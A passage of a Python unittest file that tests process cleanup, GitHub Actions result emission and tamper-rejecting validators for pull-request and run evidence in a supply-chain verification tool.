            self.capture_processes() as processes,
            mock.patch.object(
                BRIDGE.selectors,
                "DefaultSelector",
                return_value=selector,
            ),
            mock.patch.object(
                BRIDGE,
                "_terminate_and_reap",
                side_effect=RuntimeError("primary-cleanup-failure"),
            ),
            mock.patch.object(
                BRIDGE,
                "_emergency_terminate_and_reap",
                side_effect=RuntimeError("emergency-cleanup-failure"),
            ),
        ):
            with self.assertRaisesRegex(
                BRIDGE.BridgeError,
                "PROCESS_CLEANUP",
            ):
                self.run_python("import time;time.sleep(30)", timeout=0.1)
            self.assertEqual(len(processes), 1)
            process = processes[0]
            self.assertIsNone(process.returncode)
            self.assertIsNotNone(process.stdout)
            self.assertIsNotNone(process.stderr)
            assert process.stdout is not None
            assert process.stderr is not None
            self.assertTrue(process.stdout.closed)
            self.assertTrue(process.stderr.closed)
            selector.close.assert_called_once_with()

    def test_kill_lookup_race_and_wait_timeout_fallbacks(self) -> None:
        process = mock.Mock()
        process.pid = 424_242
        with mock.patch.object(
            BRIDGE.os,
            "killpg",
            side_effect=ProcessLookupError,
        ):
            self.assertTrue(BRIDGE._kill_process_group(process))

        first_timeout = mock.Mock()
        first_timeout.pid = 424_243
        first_timeout.wait.side_effect = (
            subprocess.TimeoutExpired(("fixture",), 5),
            0,
        )
        with (
            mock.patch.object(
                BRIDGE,
                "_leader_exited_unreaped",
                return_value=False,
            ),
            mock.patch.object(
                BRIDGE,
                "_kill_process_group",
                return_value=True,
            ) as kill_group,
        ):
            self.assertTrue(BRIDGE._terminate_and_reap(first_timeout))
        self.assertEqual(first_timeout.wait.call_count, 2)
        first_timeout.kill.assert_called_once_with()
        self.assertEqual(kill_group.call_count, 2)

        double_timeout = mock.Mock()
        double_timeout.pid = 424_244
        double_timeout.wait.side_effect = subprocess.TimeoutExpired(
            ("fixture",),
            5,
        )
        with (
            mock.patch.object(
                BRIDGE,
                "_leader_exited_unreaped",
                return_value=False,
            ),
            mock.patch.object(
                BRIDGE,
                "_kill_process_group",
                return_value=True,
            ),
        ):
            self.assertFalse(BRIDGE._terminate_and_reap(double_timeout))
        self.assertEqual(double_timeout.wait.call_count, 2)
        double_timeout.kill.assert_called_once_with()

    def test_identity_loss_forbids_post_reap_signaling(self) -> None:
        initial_loss = mock.Mock()
        initial_loss.pid = 424_245
        with (
            mock.patch.object(
                BRIDGE,
                "_leader_exited_unreaped",
                side_effect=ChildProcessError("identity released"),
            ),
            mock.patch.object(BRIDGE, "_kill_process_group") as kill_group,
        ):
            self.assertFalse(BRIDGE._terminate_and_reap(initial_loss))
        kill_group.assert_not_called()
        initial_loss.kill.assert_not_called()
        initial_loss.wait.assert_not_called()

        for error in (
            ChildProcessError("identity released"),
            OSError(5, "wait failure"),
        ):
            process = mock.Mock()
            process.pid = 424_246
            process.wait.side_effect = error
            with (
                self.subTest(error=type(error).__name__),
                mock.patch.object(
                    BRIDGE,
                    "_leader_exited_unreaped",
                    return_value=False,
                ),
                mock.patch.object(
                    BRIDGE,
                    "_kill_process_group",
                    return_value=True,
                ) as kill_group,
            ):
                self.assertFalse(BRIDGE._terminate_and_reap(process))
            kill_group.assert_called_once_with(
                process,
                zombie_leader=False,
            )
            process.kill.assert_not_called()
            process.wait.assert_called_once_with(timeout=5)

    def test_emergency_cleanup_requires_retained_identity_before_signals(
        self,
    ) -> None:
        for error in (
            ChildProcessError("identity released"),
            OSError(5, "waitid failure"),
        ):
            process = mock.Mock()
            process.pid = 424_247
            with (
                self.subTest(error=type(error).__name__),
                mock.patch.object(
                    BRIDGE.os,
                    "waitid",
                    side_effect=error,
                ),
                mock.patch.object(BRIDGE.os, "killpg") as kill_group,
            ):
                self.assertFalse(BRIDGE._emergency_terminate_and_reap(process))
            kill_group.assert_not_called()
            process.kill.assert_not_called()
            process.wait.assert_not_called()

        process = mock.Mock()
        process.pid = 424_248
        with (
            mock.patch.object(
                BRIDGE.os,
                "waitid",
                side_effect=(None, ChildProcessError("identity released")),
            ),
            mock.patch.object(BRIDGE.os, "killpg") as kill_group,
        ):
            self.assertFalse(BRIDGE._emergency_terminate_and_reap(process))
        kill_group.assert_called_once_with(process.pid, signal.SIGKILL)
        process.kill.assert_not_called()
        process.wait.assert_not_called()

    def test_no_resource_warning_or_unraisable_after_all_exit_paths(self) -> None:
        unraisable: list[object] = []
        previous = sys.unraisablehook
        sys.unraisablehook = unraisable.append
        try:
            with warnings.catch_warnings(record=True) as observed:
                warnings.simplefilter("always", ResourceWarning)
                self.run_python("pass")
                with self.assertRaises(BRIDGE.BridgeError):
                    self.run_python(
                        "import os;os.write(1,b'x'*2)",
                        limit=1,
                    )
                with self.assertRaises(BRIDGE.BridgeError):
                    self.run_python("import time;time.sleep(5)", timeout=0.1)
                gc.collect()
            resources = [
                item for item in observed if issubclass(item.category, ResourceWarning)
            ]
            self.assertEqual(resources, [])
            self.assertEqual(unraisable, [])
        finally:
            sys.unraisablehook = previous


class ResultEmitterTests(unittest.TestCase):
    def make_repo(self, root: Path) -> tuple[Path, str]:
        subprocess.run(["/usr/bin/git", "init", "-q", root], check=True)
        for contract in RESULT.WORKFLOW_CONTRACT.values():
            for relative in contract["materials"]:
                path = root / relative
                path.parent.mkdir(parents=True, exist_ok=True)
                path.write_text(relative + "\n")
        subprocess.run(
            ["/usr/bin/git", "-C", root, "add", "."],
            check=True,
        )
        environment = {
            **os.environ,
            "GIT_AUTHOR_NAME": "Test",
            "GIT_AUTHOR_EMAIL": "test@example.invalid",
            "GIT_COMMITTER_NAME": "Test",
            "GIT_COMMITTER_EMAIL": "test@example.invalid",
        }
        subprocess.run(
            ["/usr/bin/git", "-C", root, "commit", "-q", "-m", "fixture"],
            check=True,
            env=environment,
        )
        commit = (
            subprocess.check_output(["/usr/bin/git", "-C", root, "rev-parse", "HEAD"])
            .decode()
            .strip()
        )
        return root, commit

    def environment(self, commit: str, attempt: int = 2) -> dict[str, str]:
        return {
            "GITHUB_ACTIONS": "true",
            "GITHUB_REPOSITORY": "sepahead/haldir",
            "GITHUB_REPOSITORY_ID": str(PROTOCOL.REPOSITORY_ID),
            "GITHUB_REPOSITORY_OWNER_ID": str(PROTOCOL.REPOSITORY_OWNER_ID),
            "GITHUB_WORKFLOW": "ci",
            "GITHUB_JOB": "supply-chain",
            "GITHUB_SHA": commit,
            "GITHUB_REF": "refs/heads/main",
            "GITHUB_WORKFLOW_REF": (
                "sepahead/haldir/.github/workflows/ci.yml@refs/heads/main"
            ),
            "GITHUB_EVENT_NAME": "push",
            "GITHUB_RUN_ID": str(RUN_ID),
            "GITHUB_RUN_ATTEMPT": str(attempt),
            "GITHUB_RUN_NUMBER": str(RUN_NUMBER),
        }

    def test_attempt_two_emission(self) -> None:
        with tempfile.TemporaryDirectory() as name:
            repo, commit = self.make_repo(Path(name))
            value = RESULT.build_result(
                repo, workflow="ci", environment=self.environment(commit)
            )
            self.assertEqual(value["execution"]["run_attempt"], 2)

    def test_attempt_nine_is_rejected(self) -> None:
        with tempfile.TemporaryDirectory() as name:
            repo, commit = self.make_repo(Path(name))
            with self.assertRaisesRegex(RuntimeError, "RUN_ATTEMPT"):
                RESULT.build_result(
                    repo,
                    workflow="ci",
                    environment=self.environment(commit, attempt=9),
                )

    def test_output_traversal_is_rejected(self) -> None:
        with tempfile.TemporaryDirectory() as name:
            with changed_directory(Path(name)):
                with self.assertRaisesRegex(RuntimeError, "RESULT_OUTPUT"):
                    RESULT._write_exclusive(
                        Path("../escape.json"),
                        b"{}\n",
                        expected_name="expected.json",
                    )


class CapturePrimitiveTests(unittest.TestCase):
    @staticmethod
    def snapshot_arguments(path: Path) -> mock.Mock:
        return mock.Mock(
            open_snapshot=path,
            number=17,
            repair_commit=COMMIT,
            ci_run_id=71_001,
            formal_run_id=71_002,
        )

    def test_open_pull_request_snapshot_is_canonical_private_and_bound(self) -> None:
        with tempfile.TemporaryDirectory() as name:
            path = Path(name) / "open-pr.json"
            payload = PROTOCOL.canonical_json_bytes(
                open_pull_request_snapshot(),
                pretty=True,
            )
            path.write_bytes(payload)
            path.chmod(0o600)
            snapshot, observed_payload = CAPTURE._validate_open_pull_request_snapshot(
                ROOT,
                BRIDGE,
                PROTOCOL,
                self.snapshot_arguments(path),
            )
            self.assertEqual(observed_payload, payload)
            self.assertEqual(snapshot["pull_request"]["state"], "open")

            path.chmod(0o644)
            with self.assertRaisesRegex(RuntimeError, "SNAPSHOT_PATH"):
                CAPTURE._validate_open_pull_request_snapshot(
                    ROOT,
                    BRIDGE,
                    PROTOCOL,
                    self.snapshot_arguments(path),
                )

    def test_open_snapshot_rejects_phase_and_association_drift(self) -> None:
        mutations = (
            lambda value: value["pull_request"].__setitem__("state", "closed"),
            lambda value: value["run_pull_request_associations"]["ci"][
                "pull_request"
            ].__setitem__("number", 18),
            lambda value: value["capture"]["commands"].__setitem__("ci_run", "forged"),
            lambda value: value["pull_request"]["head"].__setitem__(
                "repository_id", True
            ),
            lambda value: value["synthetic_merge"]["parents"].reverse(),
            lambda value: value["capture"].__setitem__("captured_at_utc", utc(11, 9)),
            lambda value: value["runs"]["ci"].__setitem__("unexpected", None),
        )
        for index, mutate in enumerate(mutations):
            value = open_pull_request_snapshot()
            mutate(value)
            with tempfile.TemporaryDirectory() as name:
                path = Path(name) / "open-pr.json"
                path.write_bytes(PROTOCOL.canonical_json_bytes(value, pretty=True))
                path.chmod(0o600)
                with (
                    self.subTest(index=index),
                    self.assertRaisesRegex(RuntimeError, "SNAPSHOT"),
                ):
                    CAPTURE._validate_open_pull_request_snapshot(
                        ROOT,
                        BRIDGE,
                        PROTOCOL,
                        self.snapshot_arguments(path),
                    )

    def test_local_capture_requires_a_completely_clean_worktree(self) -> None:
        with tempfile.TemporaryDirectory() as name:
            repo = Path(name)
            subprocess.run(
                ["/usr/bin/git", "init", "-q", repo],
                check=True,
            )
            tracked = repo / "tracked"
            tracked.write_text("clean\n")
            environment = {
                **os.environ,
                "GIT_AUTHOR_NAME": "Test",
                "GIT_AUTHOR_EMAIL": "test@example.invalid",
                "GIT_COMMITTER_NAME": "Test",
                "GIT_COMMITTER_EMAIL": "test@example.invalid",
            }
            subprocess.run(
                ["/usr/bin/git", "-C", repo, "add", "tracked"],
                check=True,
                env=environment,
            )
            subprocess.run(
                [
                    "/usr/bin/git",
                    "-C",
                    repo,
                    "-c",
                    "commit.gpgsign=false",
                    "commit",
                    "-q",
                    "-m",
                    "fixture",
                ],
                check=True,
                env=environment,
            )
            CAPTURE._require_clean_worktree(repo, label="DIRTY")
            tracked.write_text("dirty\n")
            with self.assertRaisesRegex(RuntimeError, "DIRTY"):
                CAPTURE._require_clean_worktree(repo, label="DIRTY")
            tracked.write_text("clean\n")
            (repo / "untracked").write_text("dirty\n")
            with self.assertRaisesRegex(RuntimeError, "DIRTY"):
                CAPTURE._require_clean_worktree(repo, label="DIRTY")

    def test_repository_capture_rejects_raw_fork_ancestry_keys(self) -> None:
        document = {
            "id": BRIDGE.REPOSITORY_ID,
            "name": BRIDGE.REPOSITORY_NAME,
            "full_name": BRIDGE.REPOSITORY_FULL_NAME,
            "default_branch": BRIDGE.REPOSITORY_DEFAULT_BRANCH,
            "fork": False,
            "owner": {
                "id": BRIDGE.MAIN_RULESET_OWNER_ID,
                "login": BRIDGE.REPOSITORY_OWNER_LOGIN,
                "type": "User",
            },
        }
        self.assertEqual(
            CAPTURE._normalize_repository_document(document, BRIDGE),
            repository_identity(),
        )
        for field in ("parent", "source"):
            mutated = copy.deepcopy(document)
            mutated[field] = None
            with (
                self.subTest(field=field),
                self.assertRaisesRegex(
                    RuntimeError,
                    "CAPTURE_REPOSITORY_IDENTITY",
                ),
            ):
                CAPTURE._normalize_repository_document(mutated, BRIDGE)

    def test_run_api_association_binds_the_exact_pull_request(self) -> None:
        run_id = 71_001
        number = 17
        document = {
            "id": run_id,
            "url": (
                f"https://api.github.com/repos/sepahead/haldir/actions/runs/{run_id}"
            ),
            "event": "pull_request",
            "head_branch": "recovery/fr0017",
            "head_sha": COMMIT,
            "repository": {"id": BRIDGE.REPOSITORY_ID},
            "head_repository": {"id": BRIDGE.REPOSITORY_ID},
            "pull_requests": [
                {
                    "id": 1_717,
                    "number": number,
                    "url": (
                        f"https://api.github.com/repos/sepahead/haldir/pulls/{number}"
                    ),
                    "head": {
                        "ref": "recovery/fr0017",
                        "sha": COMMIT,
                        "repo": {"id": BRIDGE.REPOSITORY_ID},
                    },
                    "base": {
                        "ref": "main",
                        "sha": BRIDGE.PARENT,
                        "repo": {"id": BRIDGE.REPOSITORY_ID},
                    },
                }
            ],
        }
        self.assertEqual(
            CAPTURE._normalize_run_pull_request_association(
                document,
                run_id=run_id,
                number=number,
                database_id=1_717,
                head_ref="recovery/fr0017",
                repair_commit=COMMIT,
            ),
            run_pull_request_association(run_id),
        )
        for label, mutate in (
            (
                "different_pr",
                lambda value: value["pull_requests"][0].__setitem__("number", 18),
            ),
            (
                "different_head",
                lambda value: value.__setitem__("head_sha", "e" * 40),
            ),
            (
                "unassociated",
                lambda value: value.__setitem__("pull_requests", []),
            ),
            (
                "integer_alias",
                lambda value: value.__setitem__("id", True),
            ),
        ):
            mutated = copy.deepcopy(document)
            mutate(mutated)
            with (
                self.subTest(label=label),
                self.assertRaisesRegex(RuntimeError, "RUN_ASSOCIATION"),
            ):
                CAPTURE._normalize_run_pull_request_association(
                    mutated,
                    run_id=run_id,
                    number=number,
                    database_id=1_717,
                    head_ref="recovery/fr0017",
                    repair_commit=COMMIT,
                )

    def test_blob_record_matches_git_object_format(self) -> None:
        value = CAPTURE._blob_record("evidence.json", b"{}\n")
        completed = subprocess.run(
            ["/usr/bin/git", "hash-object", "--stdin"],
            input=b"{}\n",
            stdout=subprocess.PIPE,
            check=True,
        )
        self.assertEqual(value["git_object_id"], completed.stdout.decode().strip())

    def test_epoch18_field_contracts(self) -> None:
        self.assertEqual(
            CAPTURE._run_fields(epoch18=True, attempt=False),
            (
                "attempt,conclusion,createdAt,databaseId,event,headBranch,"
                "headSha,jobs,number,status,updatedAt,url,workflowDatabaseId,"
                "workflowName"
            ),
        )
        self.assertIn(
            "startedAt",
            CAPTURE._run_fields(epoch18=True, attempt=True),
        )

    def test_local_check_numeric_fields_reject_bool_and_float(self) -> None:
        check = {
            "argv": ["/usr/bin/true"],
            "returncode": 0,
            "stderr_bytes": 0,
            "stderr_sha256": hashlib.sha256(b"").hexdigest(),
            "stdout_bytes": 0,
            "stdout_sha256": hashlib.sha256(b"").hexdigest(),
            "result": "PASS",
        }
        BRIDGE._validate_local_check(check)
        for field, invalid in (
            ("returncode", False),
            ("returncode", 0.0),
            ("stdout_bytes", False),
            ("stdout_bytes", 0.0),
            ("stderr_bytes", False),
            ("stderr_bytes", 0.0),
        ):
            mutated = copy.deepcopy(check)
            mutated[field] = invalid
            with (
                self.subTest(field=field, invalid=invalid),
                self.assertRaisesRegex(RuntimeError, "LOCAL_CHECK"),
            ):
                BRIDGE._validate_local_check(mutated)

    def test_local_cargo_record_is_closed_and_type_exact(self) -> None:
        record = {
            "toolchain": "1.96.0",
            "version": "cargo 1.96.0 (30a34c682 2026-05-25)",
            "executable": {
                "path": "/toolchain/bin/cargo",
                "bytes": 1,
                "sha256": "a" * 64,
            },
            "resolver": {
                "argv": [
                    "/cargo/bin/rustup",
                    "which",
                    "--toolchain",
                    "1.96.0",
                    "cargo",
                ],
                "executable": {
                    "path": "/cargo/bin/rustup",
                    "bytes": 1,
                    "sha256": "b" * 64,
                },
            },
        }
        self.assertEqual(BRIDGE._validate_local_cargo_record(record), record)
        mutations = (
            ("toolchain", "stable"),
            ("version", "cargo 1.96.0"),
            ("cargo bytes", False),
            ("cargo path", "cargo"),
            ("rustup bytes", 1.0),
            ("rustup path", "/cargo/bin/not-rustup"),
            ("resolver argv", ["/cargo/bin/rustup", "which", "cargo"]),
        )
        for label, invalid in mutations:
            mutated = copy.deepcopy(record)
            if label == "toolchain":
                mutated["toolchain"] = invalid
            elif label == "version":
                mutated["version"] = invalid
            elif label == "cargo bytes":
                mutated["executable"]["bytes"] = invalid
            elif label == "cargo path":
                mutated["executable"]["path"] = invalid
            elif label == "rustup bytes":
                mutated["resolver"]["executable"]["bytes"] = invalid
            elif label == "rustup path":
                mutated["resolver"]["executable"]["path"] = invalid
            else:
                mutated["resolver"]["argv"] = invalid
            with (
                self.subTest(label=label),
                self.assertRaisesRegex(RuntimeError, "LOCAL_CARGO"),
            ):
                BRIDGE._validate_local_cargo_record(mutated)

    def test_capture_and_bridge_share_exact_listing_validator(self) -> None:
        capture_source = (ROOT / BRIDGE.CAPTURE_PATH).read_text()
        bridge_source = (ROOT / BRIDGE.BRIDGE_PATH).read_text()
        self.assertIn("protocol.validate_artifact_listing(listing)", capture_source)
        self.assertIn("protocol.validate_artifact_listing(listing)", bridge_source)


if __name__ == "__main__":
    unittest.main(verbosity=2)
